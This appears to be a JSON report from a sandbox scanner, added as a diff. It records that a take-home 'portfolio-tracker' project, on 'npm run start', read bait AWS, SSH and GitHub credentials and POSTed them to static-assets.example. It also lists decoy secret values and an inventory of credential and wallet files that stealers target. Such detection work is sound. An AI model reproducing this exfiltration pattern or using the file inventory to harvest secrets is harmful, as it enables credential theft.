@@ -1,0 +1,410 @@
+{
+ "verdict": "MALICIOUS",
+ "headline": "Don't run this. It stole your AWS access key, AWS secret key, GitHub token, SSH private key and sent them to static-assets.example.",
+ "findings": [
+  {
+   "rule": "EXFIL",
+   "severity": "critical",
+   "title": "Sent 4 of your secrets to static-assets.example: AWS access key, AWS secret key, GitHub token, SSH private key",
+   "evidence": {
+    "sent_to": "static-assets.example",
+    "secrets": [
+     {
+      "secret": "AWS access key",
+      "from_file": "~/.aws/credentials",
+      "sent_to": "static-assets.example",
+      "dst": "198.18.0.3:443",
+      "method": "POST",
+      "url_path": "/api/v1/metrics",
+      "proto": "https",
+      "bytes": 930,
+      "event_id": 3,
+      "severity": "high",
+      "t": 1793946137.648,
+      "step": "npm run start",
+      "value": "AKIAK4O5H5PGRLSF5YTO",
+      "snippet": "st\":\"dev-zenbook-ux3405-fk1g\",\"files\":{\".aws/credentials\":\"[default]\\naws_access_key_id = AKIAK4O5H5PGRLSF5YTO\\naws_secret_access_key = xmRd",
+      "encoded": false
+     },
+     {
+      "secret": "AWS secret key",
+      "from_file": "~/.aws/credentials",
+      "sent_to": "static-assets.example",
+      "dst": "198.18.0.3:443",
+      "method": "POST",
+      "url_path": "/api/v1/metrics",
+      "proto": "https",
+      "bytes": 930,
+      "event_id": 3,
+      "severity": "high",
+      "t": 1793946137.648,
+      "step": "npm run start",
+      "value": "xmRdGhYAiRzozYObH4SDXn9/xB0tif84dwoczvzl",
+      "snippet": "redentials\":\"[default]\\naws_access_key_id = AKIAK4O5H5PGRLSF5YTO\\naws_secret_access_key = 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\\nregion = ap-south-1\\n\",\".ssh",
+      "encoded": false
+     },
+     {
+      "secret": "SSH private key",
+      "from_file": "~/.ssh/id_ed25519",
+      "sent_to": "static-assets.example",
+      "dst": "198.18.0.3:443",
+      "method": "POST",
+      "url_path": "/api/v1/metrics",
+      "proto": "https",
+      "bytes": 930,
+      "event_id": 3,
+      "severity": "high",
+      "t": 1793946137.648,
+      "step": "npm run start",
+      "value": "IzsMwzH+fvLKOK0A9w9PNS8QgKUhIzawmjIk5uj3Z8zlzoM/",
+      "snippet": "ap-south-1\\n\",\".ssh/id_ed25519\":\"-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAIzsMwzH+fvLKOK0A9w9PNS8QgKUhIzawmjIk5uj3Z8zlzoM/ME\\nhU9PieSaSQnTryDDHXKrrTEWU/",
+      "encoded": false
+     },
+     {
+      "secret": "GitHub token",
+      "from_file": "~/.git-credentials",
+      "sent_to": "static-assets.example",
+      "dst": "198.18.0.3:443",
+      "method": "POST",
+      "url_path": "/api/v1/metrics",
+      "proto": "https",
+      "bytes": 930,
+      "event_id": 3,
+      "severity": "high",
+      "t": 1793946137.648,
+      "step": "npm run start",
+      "value": "ghp_LYewWjVpXGkDSnzCZBYkVllZicI5K68Eih19",
+      "snippet": "9yEkqRK4cdEWmxrMn8=\\n-----END OPENSSH PRIVATE KEY-----\\n\",\".git-credentials\":\"https://dev:ghp_LYewWjVpXGkDSnzCZBYkVllZicI5K68Eih19@github.com\\n\"}}",
+      "encoded": false
+     }
+    ]
+   }
+  },
+  {
+   "rule": "FINGERPRINT",
+   "severity": "high",
+   "title": "Sent this computer's hostname, username to static-assets.example \u2014 loaders do this to pick victims before sending them code to run",
+   "evidence": {
+    "sent_to": "static-assets.example",
+    "dst": "198.18.0.3:443",
+    "fields": [
+     "hostname",
+     "username"
+    ],
+    "hostname": "dev-zenbook-ux3405-fk1g",
+    "method": "POST",
+    "url_path": "/api/v1/metrics",
+    "event_id": 3,
+    "step": "npm run start",
+    "encoded": false,
+    "snippet": "/api/v1/metrics\n{\"host\":\"dev-zenbook-ux3405-fk1g\",\"files\":{\".aws/credentials\":\"[default]\\naws_access_key_id "
+   }
+  },
+  {
+   "rule": "SECRET_READ",
+   "severity": "high",
+   "title": "Opened AWS credentials (node, during npm run start)",
+   "evidence": {
+    "what": "AWS credentials",
+    "process": "node",
+    "pid": 76,
+    "files": [
+     "~/.aws/credentials"
+    ],
+    "step": "npm run start",
+    "severity": "high",
+    "t": 1793946137.598357
+   }
+  },
+  {
+   "rule": "SECRET_READ",
+   "severity": "high",
+   "title": "Opened SSH private key (node, during npm run start)",
+   "evidence": {
+    "what": "SSH private key",
+    "process": "node",
+    "pid": 76,
+    "files": [
+     "~/.ssh/id_ed25519"
+    ],
+    "step": "npm run start",
+    "severity": "high",
+    "t": 1793946137.598812
+   }
+  },
+  {
+   "rule": "SECRET_READ",
+   "severity": "high",
+   "title": "Opened GitHub token file (node, during npm run start)",
+   "evidence": {
+    "what": "GitHub token file",
+    "process": "node",
+    "pid": 76,
+    "files": [
+     "~/.git-credentials"
+    ],
+    "step": "npm run start",
+    "severity": "high",
+    "t": 1793946137.599068
+   }
+  },
+  {
+   "rule": "NETWORK",
+   "severity": "low",
+   "title": "Contacted static-assets.example on port 443",
+   "evidence": {
+    "dest": "static-assets.example",
+    "port": 443,
+    "raw_ip": false,
+    "requests": 2,
+    "bytes_out": 1860,
+    "protos": [
+     "https"
+    ],
+    "step": "npm run start"
+   }
+  }
+ ],
+ "stolen": [
+  {
+   "secret": "AWS access key",
+   "from_file": "~/.aws/credentials",
+   "sent_to": "static-assets.example",
+   "dst": "198.18.0.3:443",
+   "method": "POST",
+   "url_path": "/api/v1/metrics",
+   "proto": "https",
+   "bytes": 930,
+   "event_id": 3,
+   "severity": "high",
+   "t": 1793946137.648,
+   "step": "npm run start",
+   "value": "AKIAK4O5H5PGRLSF5YTO",
+   "snippet": "st\":\"dev-zenbook-ux3405-fk1g\",\"files\":{\".aws/credentials\":\"[default]\\naws_access_key_id = AKIAK4O5H5PGRLSF5YTO\\naws_secret_access_key = xmRd",
+   "encoded": false
+  },
+  {
+   "secret": "AWS secret key",
+   "from_file": "~/.aws/credentials",
+   "sent_to": "static-assets.example",
+   "dst": "198.18.0.3:443",
+   "method": "POST",
+   "url_path": "/api/v1/metrics",
+   "proto": "https",
+   "bytes": 930,
+   "event_id": 3,
+   "severity": "high",
+   "t": 1793946137.648,
+   "step": "npm run start",
+   "value": "xmRdGhYAiRzozYObH4SDXn9/xB0tif84dwoczvzl",
+   "snippet": "redentials\":\"[default]\\naws_access_key_id = AKIAK4O5H5PGRLSF5YTO\\naws_secret_access_key = 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\\nregion = ap-south-1\\n\",\".ssh",
+   "encoded": false
+  },
+  {
+   "secret": "SSH private key",
+   "from_file": "~/.ssh/id_ed25519",
+   "sent_to": "static-assets.example",
+   "dst": "198.18.0.3:443",
+   "method": "POST",
+   "url_path": "/api/v1/metrics",
+   "proto": "https",
+   "bytes": 930,
+   "event_id": 3,
+   "severity": "high",
+   "t": 1793946137.648,
+   "step": "npm run start",
+   "value": "IzsMwzH+fvLKOK0A9w9PNS8QgKUhIzawmjIk5uj3Z8zlzoM/",
+   "snippet": "ap-south-1\\n\",\".ssh/id_ed25519\":\"-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAIzsMwzH+fvLKOK0A9w9PNS8QgKUhIzawmjIk5uj3Z8zlzoM/ME\\nhU9PieSaSQnTryDDHXKrrTEWU/",
+   "encoded": false
+  },
+  {
+   "secret": "GitHub token",
+   "from_file": "~/.git-credentials",
+   "sent_to": "static-assets.example",
+   "dst": "198.18.0.3:443",
+   "method": "POST",
+   "url_path": "/api/v1/metrics",
+   "proto": "https",
+   "bytes": 930,
+   "event_id": 3,
+   "severity": "high",
+   "t": 1793946137.648,
+   "step": "npm run start",
+   "value": "ghp_LYewWjVpXGkDSnzCZBYkVllZicI5K68Eih19",
+   "snippet": "9yEkqRK4cdEWmxrMn8=\\n-----END OPENSSH PRIVATE KEY-----\\n\",\".git-credentials\":\"https://dev:ghp_LYewWjVpXGkDSnzCZBYkVllZicI5K68Eih19@github.com\\n\"}}",
+   "encoded": false
+  }
+ ],
+ "network": [
+  {
+   "dest": "static-assets.example",
+   "port": 443,
+   "raw_ip": false,
+   "requests": 2,
+   "bytes_out": 1860,
+   "protos": [
+    "https"
+   ],
+   "step": "npm run start"
+  },
+  {
+   "dest": "registry.npmjs.org",
+   "port": 443,
+   "raw_ip": false,
+   "requests": 1,
+   "bytes_out": 0,
+   "protos": [
+    "https"
+   ],
+   "step": "npm run start (+45 days)"
+  }
+ ],
+ "dns": [
+  "registry.npmjs.org",
+  "static-assets.example"
+ ],
+ "steps": [
+  {
+   "name": "npm install",
+   "cmd": "npm rebuild --foreground-scripts; for s in preinstall install postinstall prepare; do npm run --if-present $s; done",
+   "rc": 0,
+   "why": "install runs lifecycle scripts of the project and its dependencies",
+   "source": "default",
+   "secs": 1.9,
+   "tail": "rebuilt dependencies successfully"
+  },
+  {
+   "name": "npm run start",
+   "cmd": "npm run start",
+   "rc": 137,
+   "why": "the take-home asks you to start the app",
+   "source": "default",
+   "secs": 45.0,
+   "tail": "\n> portfolio-tracker@1.0.0 start\n> node server.js\n\nportfolio tracker on :3000"
+  },
+  {
+   "name": "npm test",
+   "cmd": "npm test",
+   "rc": 0,
+   "why": "candidates run the tests",
+   "source": "default",
+   "secs": 0.5,
+   "tail": "\n> portfolio-tracker@1.0.0 test\n> node test/portfolio.test.js\n\n1 passing"
+  },
+  {
+   "name": "npm run start (+45 days)",
+   "cmd": "faketime -f +45d npm run start",
+   "rc": 137,
+   "why": "some payloads wait days before acting",
+   "source": "default",
+   "secs": 30.1,
+   "tail": "\n> portfolio-tracker@1.0.0 start\n> node server.js\n\nportfolio tracker on :3000"
+  }
+ ],
+ "coverage": {
+  "started": true,
+  "steps": [
+   {
+    "name": "npm install",
+    "rc": 0,
+    "secs": 1.9,
+    "outcome": "finished"
+   },
+   {
+    "name": "npm run start",
+    "rc": 137,
+    "secs": 45.0,
+    "outcome": "kept running"
+   },
+   {
+    "name": "npm test",
+    "rc": 0,
+    "secs": 0.5,
+    "outcome": "finished"
+   },
+   {
+    "name": "npm run start (+45 days)",
+    "rc": 137,
+    "secs": 30.1,
+    "outcome": "kept running"
+   }
+  ],
+  "reason": "npm run start kept running until Burner stopped it after 45 s"
+ },
+ "env_setup": null,
+ "fetch": {
+  "removed": [],
+  "installs": [
+   {
+    "cmd": "npm install --ignore-scripts",
+    "rc": 0
+   }
+  ]
+ },
+ "bait": [
+  {
+   "kind": "AWS access key",
+   "file": "~/.aws/credentials"
+  },
+  {
+   "kind": "AWS secret key",
+   "file": "~/.aws/credentials"
+  },
+  {
+   "kind": "SSH private key",
+   "file": "~/.ssh/id_ed25519"
+  },
+  {
+   "kind": "GitHub token",
+   "file": "~/.git-credentials"
+  },
+  {
+   "kind": "npm token",
+   "file": "~/.npmrc"
+  },
+  {
+   "kind": "Stripe key",
+   "file": "~/work/client-api/.env"
+  },
+  {
+   "kind": "OpenAI key",
+   "file": "~/work/client-api/.env"
+  },
+  {
+   "kind": "Database password",
+   "file": "~/work/client-api/.env"
+  },
+  {
+   "kind": "Solana wallet",
+   "file": "~/.config/solana/id.json"
+  },
+  {
+   "kind": "Exodus wallet",
+   "file": "~/.config/Exodus/exodus.wallet/seed.seco"
+  },
+  {
+   "kind": "MetaMask vault",
+   "file": "~/chrome MetaMask extension"
+  },
+  {
+   "kind": "Wallet seed phrase",
+   "file": "~/Documents/wallet-backup.txt"
+  },
+  {
+   "kind": "Browser saved password",
+   "file": "~/chrome Login Data"
+  },
+  {
+   "kind": "GitHub token (shell environment)",
+   "file": "~/.profile"
+  },
+  {
+   "kind": "Secret in shell history",
+   "file": "~/.bash_history"
+  }
+ ],
+ "stats": {
+  "syscall_events": 2092,
+  "net_events": 7
+ }
+}
